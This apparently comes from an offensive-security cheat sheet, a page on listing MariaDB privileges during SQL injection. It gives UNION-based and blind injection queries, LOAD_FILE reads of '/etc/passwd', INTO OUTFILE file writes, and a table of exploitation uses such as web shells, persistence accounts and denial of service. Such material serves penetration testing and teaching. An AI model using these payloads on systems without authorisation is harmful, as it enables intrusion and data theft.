---
title: Privileges
description: Understanding and checking MariaDB privileges for SQL injection attacks
category: Information Gathering
order: 14
tags: ["privileges", "permissions", "file access"]
lastUpdated: 2025-12-18
---

## Privileges

Understanding MariaDB privileges is crucial for determining what actions are possible during an SQL injection attack. Privilege information can reveal whether you can access files, execute commands, or perform other sensitive operations.

### Current User Identification

MariaDB provides two functions for user identification:

| Function         | Description                             | Example Result    |
| ---------------- | --------------------------------------- | ----------------- |
| `USER()`         | Returns the connection username@host    | `root@172.17.0.1` |
| `CURRENT_USER()` | Returns the authenticated username@host | `root@%`          |

```sql
-- Get current user
SELECT CURRENT_USER() AS current_user
-- Returns: 'root@%'

-- Get connection user
SELECT USER() AS connection_user
-- Returns: 'root@172.17.0.1'

```

> **Note:** See [Database Credentials](/mariadb/database-credentials) for USER() parsing techniques.

### Checking Current User Privileges

To check what privileges the current database user has:

```sql
-- User-level privileges (global)
SELECT privilege_type FROM information_schema.user_privileges
WHERE grantee = CONCAT("'", REPLACE(CURRENT_USER(), "@", "'@'"), "'")
```

For checking privileges on specific databases:

```sql
-- Database-level privileges
SELECT table_schema, privilege_type FROM information_schema.schema_privileges
WHERE grantee = CONCAT("'", REPLACE(CURRENT_USER(), "@", "'@'"), "'")

-- With LIMIT for controlled output
SELECT table_schema, privilege_type FROM information_schema.schema_privileges
WHERE grantee = CONCAT("'", REPLACE(CURRENT_USER(), "@", "'@'"), "'")
LIMIT 10
```

For table-specific privileges:

```sql
-- Table-level privileges
SELECT table_schema, table_name, privilege_type FROM information_schema.table_privileges
WHERE grantee = CONCAT("'", REPLACE(CURRENT_USER(), "@", "'@'"), "'")
```

For column-specific privileges:

```sql
-- Column-level privileges
SELECT table_schema, table_name, column_name, privilege_type
FROM information_schema.column_privileges
WHERE grantee = CONCAT("'", REPLACE(CURRENT_USER(), "@", "'@'"), "'")

-- With LIMIT for controlled output
SELECT table_schema, table_name, column_name, privilege_type
FROM information_schema.column_privileges
WHERE grantee = CONCAT("'", REPLACE(CURRENT_USER(), "@", "'@'"), "'")
LIMIT 10
```

For routine (stored procedure/function) privileges:

```sql
-- Routine-level privileges (may not exist in all versions)
SELECT routine_schema, routine_name, privilege_type
FROM information_schema.routine_privileges
WHERE grantee = CONCAT("'", REPLACE(CURRENT_USER(), "@", "'@'"), "'")

-- With LIMIT for controlled output
SELECT routine_schema, routine_name, privilege_type
FROM information_schema.routine_privileges
WHERE grantee = CONCAT("'", REPLACE(CURRENT_USER(), "@", "'@'"), "'")
LIMIT 10
```

### Important Privileges to Check

| Privilege        | Description                      | Exploitation Potential                                                      |
| ---------------- | -------------------------------- | --------------------------------------------------------------------------- |
| `FILE`           | Allows reading and writing files | Read sensitive files; write web shells                                      |
| `SUPER`          | Administrative privilege         | Kill threads; change system variables; manage replication; bypass read-only |
| `SHUTDOWN`       | Can shutdown the database        | Denial of service                                                           |
| `CREATE USER`    | Can create new users             | Create privileged users for persistence                                     |
| `PROCESS`        | Can see all processes            | View queries from other users                                               |
| `RELOAD`         | Can reload server settings       | Can flush privileges                                                        |
| `ALL PRIVILEGES` | All privileges (admin)           | Complete database control                                                   |

### Checking for FILE Privilege

The FILE privilege is particularly important as it allows reading from and writing to files on the server:

```sql
-- Quick check for FILE privilege
SELECT COUNT(*) FROM mysql.user WHERE user = SUBSTRING_INDEX(USER(), '@', 1) AND File_priv = 'Y';
```

> **Caution:** This query only matches by username, ignoring the host. If the same username exists with different hosts (e.g., `admin@localhost` vs `admin@%`), results may be incorrect. Use the `information_schema.user_privileges` approach below for accurate checks.

Or more generally using information_schema:

```sql
SELECT 1 FROM information_schema.user_privileges WHERE grantee = CONCAT("'", REPLACE(CURRENT_USER(), "@", "'@'"), "'") AND privilege_type = 'FILE';
```

### Checking for Specific Capabilities

#### Can you read files?

```sql
-- Returns 1 if you can read files
SELECT (SELECT COUNT(*) FROM mysql.user WHERE user = SUBSTRING_INDEX(USER(), '@', 1) AND File_priv = 'Y') > 0;
```

#### Can you write files?

```sql
-- Same check as reading files (FILE privilege covers both)
SELECT (SELECT COUNT(*) FROM mysql.user WHERE user = SUBSTRING_INDEX(USER(), '@', 1) AND File_priv = 'Y') > 0;
```

### Checking All Privileges at Once

```sql
-- Show all privileges for current user (requires mysql.user access)
SELECT * FROM mysql.user WHERE user = SUBSTRING_INDEX(USER(), '@', 1)

-- GROUP_CONCAT all privileges into one string
SELECT GROUP_CONCAT(privilege_type) AS privileges
FROM information_schema.user_privileges
WHERE grantee = CONCAT("'", REPLACE(CURRENT_USER(), "@", "'@'"), "'")
-- Returns: 'SELECT,INSERT,UPDATE,DELETE,CREATE,...'

-- Count total privileges
SELECT COUNT(*) AS privilege_count
FROM information_schema.user_privileges
WHERE grantee = CONCAT("'", REPLACE(CURRENT_USER(), "@", "'@'"), "'")

-- Check multiple privileges at once using subqueries
SELECT
  (SELECT COUNT(*) FROM information_schema.user_privileges
   WHERE grantee = CONCAT("'", REPLACE(CURRENT_USER(), "@", "'@'"), "'")
   AND privilege_type = 'FILE') AS file_priv,
  (SELECT COUNT(*) FROM information_schema.user_privileges
   WHERE grantee = CONCAT("'", REPLACE(CURRENT_USER(), "@", "'@'"), "'")
   AND privilege_type = 'PROCESS') AS process_priv,
  (SELECT COUNT(*) FROM information_schema.user_privileges
   WHERE grantee = CONCAT("'", REPLACE(CURRENT_USER(), "@", "'@'"), "'")
   AND privilege_type = 'SUPER') AS super_priv

-- Simplified two-privilege check
SELECT
  (SELECT COUNT(*) FROM information_schema.user_privileges
   WHERE grantee = CONCAT("'", REPLACE(CURRENT_USER(), "@", "'@'"), "'")
   AND privilege_type = 'FILE') AS file_priv,
  (SELECT COUNT(*) FROM information_schema.user_privileges
   WHERE grantee = CONCAT("'", REPLACE(CURRENT_USER(), "@", "'@'"), "'")
   AND privilege_type = 'PROCESS') AS process_priv
```

### Practical Usage

If you have the FILE privilege, you can:

- Read sensitive files like `/etc/passwd` using `LOAD_FILE()`
- Write web shells using `INTO OUTFILE`
- Access database configuration files

### Example: Checking and Using FILE Privilege

```sql
-- Check if we have FILE privilege (requires mysql.user access)
SELECT IF(
  (SELECT COUNT(*) FROM mysql.user WHERE user = SUBSTRING_INDEX(USER(), '@', 1) AND File_priv = 'Y') > 0,
  'Yes, we can read/write files',
  'No file privileges'
) AS result

-- Alternative check without mysql.user (uses information_schema)
SELECT IF(
  (SELECT COUNT(*) FROM information_schema.user_privileges
   WHERE grantee = CONCAT("'", REPLACE(CURRENT_USER(), "@", "'@'"), "'")
   AND privilege_type = 'FILE') > 0,
  'Has FILE',
  'No FILE'
) AS result

-- If yes, try reading a sensitive file
SELECT LOAD_FILE('/etc/passwd')

-- Write to a file (requires FILE privilege and suitable secure_file_priv)
SELECT 'test content' INTO OUTFILE '/tmp/test.txt'
```

### Boolean-Based Privilege Detection

Using EXISTS for privilege checks in blind injection scenarios:

```sql
-- Check if SELECT privilege exists
SELECT IF(
  EXISTS(SELECT 1 FROM information_schema.user_privileges
         WHERE grantee = CONCAT("'", REPLACE(CURRENT_USER(), "@", "'@'"), "'")
         AND privilege_type = 'SELECT'),
  1, 0
) AS has_select

-- Check if SUPER user (boolean result)
SELECT IF(
  (SELECT COUNT(*) FROM information_schema.user_privileges
   WHERE grantee = CONCAT("'", REPLACE(CURRENT_USER(), "@", "'@'"), "'")
   AND privilege_type = 'SUPER') > 0,
  1, 0
) AS is_super
-- Returns: 1 if user has SUPER privilege, 0 otherwise
```

### Privilege Enumeration in Injection Context

#### UNION-Based Extraction

```sql
-- Extract privileges via UNION injection
SELECT id, username FROM users WHERE id = 999
UNION SELECT 1, privilege_type FROM information_schema.user_privileges
WHERE grantee = CONCAT("'", REPLACE(CURRENT_USER(), "@", "'@'"), "'")
LIMIT 10

-- Extract with GROUP_CONCAT for single-row output
SELECT id, username FROM users WHERE id = 999
UNION SELECT 1, GROUP_CONCAT(privilege_type)
FROM information_schema.user_privileges
WHERE grantee = CONCAT("'", REPLACE(CURRENT_USER(), "@", "'@'"), "'")

-- Basic UNION without GROUP_CONCAT
SELECT id, username FROM users WHERE id = 999
UNION SELECT 1, privilege_type FROM information_schema.user_privileges
WHERE grantee = CONCAT("'", REPLACE(CURRENT_USER(), "@", "'@'"), "'")
LIMIT 5
```

#### Subquery-Based Extraction

```sql
-- Extract privilege info as subquery
SELECT (SELECT GROUP_CONCAT(privilege_type) FROM information_schema.user_privileges
        WHERE grantee = CONCAT("'", REPLACE(CURRENT_USER(), "@", "'@'"), "'")) AS privs
```

### MariaDB-Specific Notes

MariaDB's default `secure_file_priv` setting may be less restrictive than MySQL. Check the current setting:

```sql
SELECT @@secure_file_priv AS secure_file_priv
```

| Value    | Meaning                                            |
| -------- | -------------------------------------------------- |
| `NULL`   | File operations are completely disabled            |
| `''`     | File operations allowed anywhere (no restrictions) |
| `/path/` | File operations restricted to specified directory  |

An empty value means file operations are allowed anywhere the MariaDB user has filesystem permissions.

> **Verification Note:** Some MariaDB versions display different values between `SHOW VARIABLES LIKE 'secure_file_priv'` and `SELECT @@secure_file_priv`. Use both methods to verify the actual setting. Behavior varies by MariaDB version and distribution.

### Privilege Levels in MariaDB

Privileges are granted at different levels:

| Level    | Stored In            | Description                        |
| -------- | -------------------- | ---------------------------------- |
| Global   | `mysql.user`         | Applies to all databases           |
| Database | `mysql.db`           | Applies to specific database       |
| Table    | `mysql.tables_priv`  | Applies to specific table          |
| Column   | `mysql.columns_priv` | Applies to specific column         |
| Routine  | `mysql.procs_priv`   | Applies to stored procedures/funcs |

### Note

The actual privileges available to you depend on:

1. The MariaDB version
2. Server configuration (`secure_file_priv`, etc.)
3. User account configuration
4. Whether you're connecting from localhost or remotely
5. Grant hierarchy (global → database → table → column)
